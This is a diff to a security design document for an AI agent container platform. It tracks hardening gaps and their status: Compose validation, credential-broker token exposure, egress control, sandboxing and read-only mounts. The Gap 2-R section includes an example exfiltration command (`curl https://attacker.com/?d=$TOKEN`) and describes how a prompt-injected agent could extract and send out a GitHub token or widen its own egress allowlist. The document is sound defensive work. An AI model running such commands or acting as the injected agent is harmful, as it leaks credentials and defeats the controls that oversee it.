@@ -68,9 +68,18 @@ doesn't weaken it:
 - **Per-session network + label isolation**: each Docker-enabled session gets its own
   bridge network; cross-session access is blocked by source-IP identification with
   `NET_RAW` dropped to prevent spoofing.
-- **Compose has real validation** (`compose-generator.ts:351-421`): rejects
+- **Compose has real validation** (`compose-generator.ts`, `parseComposeFile`): rejects
   `privileged: true`, `network_mode: host`, docker-socket mounts (unless explicitly
-  opted in), absolute bind paths, and `..` traversal.
+  opted in), absolute bind paths, and `..` traversal. Per-service until planning#386,
+  which is the shape of the hole it left: the top-level `volumes:` and `networks:`
+  blocks are not services, so nothing read them, and a local-driver `driver_opts`
+  bind (`type: none` + `device:`) is a host bind that a service mounts by name.
+  `validateTopLevelVolumes` / `validateTopLevelNetworks` now refuse `driver_opts`,
+  a non-`local`/`bridge` driver, `external:`, a `name:` override in either block,
+  and `ipam:` on a network — and `include:` is refused in every session rather
+  than contained ones only, since an included file's blocks are never validated.
+  **Still open:** service `extends:` is refused only in contained sessions, so an
+  Open session's effective service definition can arrive from an unvalidated file.
 - **Chat history / usage / session metadata are NOT agent-writable.** They live in the
   orchestrator-host SQLite DB (`.shipit.db`), which is never mounted into the container
   (`app-di.ts:136`). The agent cannot corrupt them from inside — this already realizes
@@ -78,7 +87,7 @@ doesn't weaken it:
   that way (see Gap 6 for the inverse risk on the data that *is* mounted).
 - Neither the **shared** `/credentials/.gitconfig` nor the per-workspace `.git/config`
   embeds the GitHub token — both point at the brokered `shipit-git-credential` helper
-  (`session-credentials.ts:49-59`; workspace routed via SHI-72). No plaintext PAT on disk.
+  (`session-credentials.ts:49-59`; workspace routed via planning#74). No plaintext PAT on disk.
   But the broker remains agent-callable, so the token is still extractable on demand — see
   Gap 2-R.
 
@@ -131,7 +140,7 @@ tiers, built **sequentially in one PR** (one self-contained commit per tier, eac
   injection currently on the branch.
 
 Config moves to the **browser** (default-on global toggle + per-session override +
-allowlist editor), safe to mutate there because SHI-129 default-denies the container from
+allowlist editor), safe to mutate there because planning#131 default-denies the container from
 the orchestrator API. The **identity-validating proxy** is the **Phase-2** work on the Tier C
 hook: `validateIdentity` (`sni-proxy/main.go`) now enforces **SNI-scoped tenant identity** on
 configured multi-tenant hosts — permitting only the session's approved bucket/account
@@ -173,14 +182,14 @@ shared gitconfig, and make that broker **host-aware** — read `host=` from stdi
 credentials only for the configured GitHub host(s), echoing nothing otherwise. Cheap,
 self-contained, high-value; ships independently of the broader egress work.
 
-**Status (SHI-72, shipped):** both sub-problems above are fixed and verified live
+**Status (planning#74, shipped):** both sub-problems above are fixed and verified live
 (2026-06-03). The workspace `.git/config` now points at `shipit-git-credential` (no
 plaintext `ghp_…` on disk), and the broker is host-aware (`git credential fill` for a
 non-GitHub host returns nothing). See Gap 2-R for the residual this *doesn't* close.
 
-### Gap 2-R — The credential broker is caller-blind (residual after SHI-72) *(highest priority)*
+### Gap 2-R — The credential broker is caller-blind (residual after planning#74) *(highest priority)*
 
-**Empirically verified in a live session (2026-06-03), after SHI-72 landed.** Closing the
+**Empirically verified in a live session (2026-06-03), after planning#74 landed.** Closing the
 plaintext-at-rest and host-blindness problems did **not** make the token unreachable by an
 injected agent. The brokered helper is freely invokable by any code running in the
 container, and it returns the full PAT for the legitimate host:
@@ -204,7 +213,7 @@ reads the token via the broker and then exfiltrates it by some *other* channel (
 `curl https://attacker.com/?d=$TOKEN`). That exfil channel is exactly Gap 1, which is
 still open, so today the residual is fully exploitable end-to-end.
 
-In short: SHI-72 moved the token from "plaintext in a file the agent can `cat`" to
+In short: planning#74 moved the token from "plaintext in a file the agent can `cat`" to
 "available on demand from a broker the agent can call." For a *passive* read that's a real
 improvement; for the *active* adversary in the threat model (injected agent, malicious
 `agent.install`, compromised dependency) it is not a barrier.
@@ -224,7 +233,7 @@ improvement; for the *active* adversary in the threat model (injected agent, mal
 - **Gap 1 egress control** as the backstop: even an extracted token can't be shipped out
   if egress is default-deny. None of these fully substitutes for the others; they compose.
 
-**Status (SHI-79, partial — short-lived-token *mechanism* shipped):** the highest-leverage
+**Status (planning#81, partial — short-lived-token *mechanism* shipped):** the highest-leverage
 mitigation (short-lived, repo-scoped tokens) is now wired into the credential broker, gated
 behind operator-supplied GitHub App credentials:
 
@@ -289,21 +298,21 @@ rigor as external input — because all of them are vectors for the injected-con
 in the threat model. This is less a single fix than a lens to apply to Gaps 1/3 and to
 future input surfaces (web fetch, MCP tool returns).
 
-**Status:** the general lens shipped in SHI-98 (`docs/201`) — a reusable provenance
+**Status:** the general lens shipped in planning#100 (`docs/201`) — a reusable provenance
 envelope (`shared/untrusted-input.ts`) over brokered file/upload content plus a
-system-prompt rule. The **issue-text slice shipped in SHI-85** (`docs/176`): the
+system-prompt rule. The **issue-text slice shipped in planning#87** (`docs/176`): the
 `shipit issue` shim wraps fetched title/body/comments in the same envelope, comments
 framed lower-trust than the body. Both are defense-in-depth — the load-bearing barrier
-stays the environment layer (Gap 1 egress SHI-90, Gap 2-R scoped tokens SHI-79).
+stays the environment layer (Gap 1 egress planning#92, Gap 2-R scoped tokens planning#81).
 
-### Gap 5 — Shared host kernel (gVisor / seccomp / read-only rootfs) — *SHI-97, shipped (default-OFF)*
+### Gap 5 — Shared host kernel (gVisor / seccomp / read-only rootfs) — *planning#99, shipped (default-OFF)*
 
 Containers run the default `runc` runtime on the shared host kernel. The article uses
 gVisor (syscall interception) for ephemeral claude.ai and full VMs for Cowork precisely
 because shared-kernel isolation is the weakest tier. Given the strong cap-dropping already
 in place this is lower priority than egress, but the three controls below are now wired —
 each independently shippable, each **env-gated default-OFF** so merging is inert until an
-operator opts in (the verify-on-a-live-host-first pattern SHI-90 used). Resolved in
+operator opts in (the verify-on-a-live-host-first pattern planning#92 used). Resolved in
 `container-hardening.ts`, applied in `container-lifecycle.ts createContainer` HostConfig.
 
 **1. gVisor (`runsc`) — decision: ADOPT as operator opt-in, default `runc`.**
@@ -343,8 +352,8 @@ coverage, essential-allowed, high-risk-denied) — **not** live kernel behavior,
 a real Docker host before enabling in prod.
 
 **3. Read-only root filesystem — `SESSION_READONLY_ROOTFS=1`.** Sets
-`ReadonlyRootfs: true` plus the minimal writable set. This builds directly on SHI-31's
-non-root writable-path enumeration (docs/150) and is distinct from SHI-45's `:ro`
+`ReadonlyRootfs: true` plus the minimal writable set. This builds directly on planning#33's
+non-root writable-path enumeration (docs/150) and is distinct from planning#47's `:ro`
 bind-mount downgrade of `/uploads`+`/credentials` (Gap 6) — this is the **whole-rootfs**
 layer. The writable set splits in two:
 
@@ -381,12 +390,12 @@ mount and downgrade to `:ro` where the agent has no legitimate write need (uploa
 candidate; credentials need write only during first-turn provisioning and could be
 provisioned then remounted read-only).
 
-This is distinct from Gap 5's `ReadonlyRootfs` (SHI-97), which makes the **whole image
+This is distinct from Gap 5's `ReadonlyRootfs` (planning#99), which makes the **whole image
 rootfs** read-only with a tmpfs writable set; Gap 6 is the per-mount `:ro` downgrade of
 the **persistent data mounts** (`/uploads`, `/credentials`) that stay writable even under
 Gap 5. The two compose.
 
-#### `/uploads` → `:ro` — **shipped (SHI-45).**
+#### `/uploads` → `:ro` — **shipped (planning#47).**
 
 `buildMounts` (`container-lifecycle.ts`) now mounts `/uploads` read-only in **both**
 runtime modes: the dev bind is `:ro` and the prod volume-subpath carries `ReadOnly: true`.
@@ -400,9 +409,9 @@ uploads. Tests assert the `:ro` bind and `ReadOnly: true` volume in
 `container-lifecycle.test.ts`. Agent-facing docs updated (`shipit-docs/environment.md`:
 `/uploads` is read-only; copy elsewhere to transform).
 
-#### `/credentials` → `:ro` — **blocked; prerequisite scoped (SHI-164).**
+#### `/credentials` → `:ro` — **blocked; prerequisite scoped (planning#166).**
 
-`/credentials` is **not** flipped to `:ro` in SHI-45. The blocker is that the agent CLI
+`/credentials` is **not** flipped to `:ro` in planning#47. The blocker is that the agent CLI
 refreshes its short-lived OAuth **access token in place inside this mount**: the CLI's
 credential file (`~/.claude/.credentials.json` → `/credentials/.claude/.credentials.json`;
 Codex equivalently under `/credentials/.codex`) is **rewritten** by the CLI when it rotates
@@ -415,7 +424,7 @@ credential ops (`provisionAgentCredentials`/`copyCredentialPath`, `syncAgentToke
 `syncAgentTokenBack`, `repushAgentToken` in `session-credentials.ts`) all write the **host**
 path directly and are unaffected by the container mount mode. So the prerequisite is narrow:
 
-**What must move first (SHI-164):** relocate the agent CLI's *writable* token file out of
+**What must move first (planning#166):** relocate the agent CLI's *writable* token file out of
 the `/credentials` mount.
 
 1. Point the CLI's credential symlink target (or `CLAUDE_*`/`CODEX_*` config home) at a
@@ -430,12 +439,12 @@ the `/credentials` mount.
 
 Out-of-process refresh (an orchestrator-owned central refresher) is the alternative, but
 docs/142 rated it fragile; relocating the write target is the lower-risk path that preserves
-the per-session copy model. Tracked as **SHI-164**
-(<https://linear.app/shipit-ai/issue/SHI-164>); references docs/142.
+the per-session copy model. Tracked as **planning#166**
+(planning#166); references docs/142.
 
-#### Cross-platform validation (SHI-45)
+#### Cross-platform validation (planning#47)
 
-SHI-45 also owns cross-platform validation of the container hardening. The hardening this
+planning#47 also owns cross-platform validation of the container hardening. The hardening this
 issue adds — and the existing mount/HostConfig hardening it sits alongside — is expressed
 **entirely through standard Docker API fields**, not platform-specific mechanisms, so it is
 portable by construction across the supported hosts:
@@ -445,7 +454,7 @@ portable by construction across the supported hosts:
   honored identically by Docker Engine (Linux), Docker Desktop (macOS, virtiofs), and Docker
   Desktop (WSL2 backend). There is no host filesystem dependence — the read-only enforcement
   is the daemon's, not the host FS's.
-- **No new platform-specific surface.** SHI-45 introduces no sysctls, capabilities, runtimes,
+- **No new platform-specific surface.** planning#47 introduces no sysctls, capabilities, runtimes,
   seccomp, or bind-path assumptions (those live in Gaps 1/5 and are independently host-gated
   and live-verified — see their checklist entries). It only changes a mount mode.
 
@@ -457,7 +466,7 @@ on every platform, since `buildMounts` is pure and platform-independent. These p
 no Docker socket / Docker-in-Docker (`docker` is not on PATH), so a real `:ro`-enforcement
 check (write into `/uploads` from inside a running session container → EROFS/EACCES) cannot
 run from here. That live check belongs on a real Docker host, the same verify-on-a-live-host
-pattern SHI-90 (egress) and SHI-97 (kernel-tier) used; the dogfood container-mode orchestrator
+pattern planning#92 (egress) and planning#99 (kernel-tier) used; the dogfood container-mode orchestrator
 on the maintainer's host is the venue. The 067 cross-platform checklist (Linux Docker Engine,
 WSL2 Docker Desktop, WSL2 native Docker Engine) tracks the remaining live matrix; the `:ro`
 mount mode is not expected to behave differently across them because it is a daemon-level API
@@ -468,14 +477,14 @@ matrix when it runs.
 
 | Pri | Gap | Why first | Rough shape |
 |----|-----|-----------|-------------|
-| ✅ | Gap 2 — host-scoped git helper (SHI-72) | Shipped in SHI-72 — no plaintext on disk, broker host-aware | Done |
-| ✅ | Open orchestrator API to containers (SHI-129) | A prompt-injected agent could `curl` the full control plane (write secrets, add MCP servers) — and widen its own Gap 1 egress allowlist | Done — bridge-IP origin guard default-denies container callers to a narrow per-session allowlist (`docs/201-container-api-trust-boundary/`) |
-| P0 | Gap 2-R — broker is caller-blind (SHI-79) | Residual: agent still extracts the PAT on demand via the broker | Short-lived scoped tokens and/or out-of-process git; egress backstop |
+| ✅ | Gap 2 — host-scoped git helper (planning#74) | Shipped in planning#74 — no plaintext on disk, broker host-aware | Done |
+| ✅ | Open orchestrator API to containers (planning#131) | A prompt-injected agent could `curl` the full control plane (write secrets, add MCP servers) — and widen its own Gap 1 egress allowlist | Done — bridge-IP origin guard default-denies container callers to a narrow per-session allowlist (`docs/201-container-api-trust-boundary/`) |
+| P0 | Gap 2-R — broker is caller-blind (planning#81) | Residual: agent still extracts the PAT on demand via the broker | Short-lived scoped tokens and/or out-of-process git; egress backstop |
 | P0 | Gap 1 — egress allowlist | The load-bearing defense once approval friction is gone | Default-deny egress proxy / internal net + gateway; identity-validating proxy for multi-tenant hosts |
 | ✅ | Gap 3 — repo trust gate | Stops "open repo == run its code" | Done — per-remote trust gate defers install/compose until the user trusts the remote (`service-manager-setup.ts`, `RepoStore.isTrusted`, `RepoTrustBanner`; `docs/178-repo-trust-gate`) |
-| ◑ | Gap 6 — read-only mounts (SHI-45) | Structural, low-risk | `/uploads` `:ro` shipped + cross-platform validated; `/credentials` `:ro` blocked on SHI-164 (in-mount OAuth refresh, docs/142) |
-| ✅ | Gap 5 — gVisor / seccomp / ro-rootfs (SHI-97) | Hardens the weakest tier | Done (default-OFF) — `SESSION_RUNTIME` (gVisor opt-in), `SESSION_SECCOMP` (custom profile), `SESSION_READONLY_ROOTFS` (`container-hardening.ts`) |
-| —  | Gap 4 — untrusted-input lens (SHI-98 + issue slice SHI-85) | Cross-cutting | Apply to Gaps 1/3 and future input surfaces |
+| ◑ | Gap 6 — read-only mounts (planning#47) | Structural, low-risk | `/uploads` `:ro` shipped + cross-platform validated; `/credentials` `:ro` blocked on planning#166 (in-mount OAuth refresh, docs/142) |
+| ✅ | Gap 5 — gVisor / seccomp / ro-rootfs (planning#99) | Hardens the weakest tier | Done (default-OFF) — `SESSION_RUNTIME` (gVisor opt-in), `SESSION_SECCOMP` (custom profile), `SESSION_READONLY_ROOTFS` (`container-hardening.ts`) |
+| —  | Gap 4 — untrusted-input lens (planning#100 + issue slice planning#87) | Cross-cutting | Apply to Gaps 1/3 and future input surfaces |
 
 ## Design principles to preserve
 
@@ -498,11 +507,11 @@ matrix when it runs.
   (`SESSION_RUNTIME` gVisor opt-in, `SESSION_SECCOMP` profile, `SESSION_READONLY_ROOTFS`
   + the tmpfs writable set); `docker/seccomp/session-worker.json` is the profile;
   `docker/session-worker/entrypoint.sh` re-creates the credential symlinks into the tmpfs
-  HOME under `SHIPIT_READONLY_HOME=1` (SHI-97).
+  HOME under `SHIPIT_READONLY_HOME=1` (planning#99).
 - `src/server/orchestrator/session-container.ts` — network creation (Gap 1).
 - `src/server/orchestrator/github-auth.ts:225` — git credential helper (Gap 2).
 - `src/server/orchestrator/github-app-token.ts` — `GitHubAppTokenMinter`: short-lived,
-  repo-scoped GitHub App installation tokens (Gap 2-R / SHI-79). Broker integration in
+  repo-scoped GitHub App installation tokens (Gap 2-R / planning#81). Broker integration in
   `services/github.ts` (`getRepoScopedGitCredential`) and `api-routes-github.ts`.
 - `src/server/orchestrator/service-manager-setup.ts:306`,
   `src/server/session/session-worker.ts:689` — `agent.install` + compose `command:`/`build:`
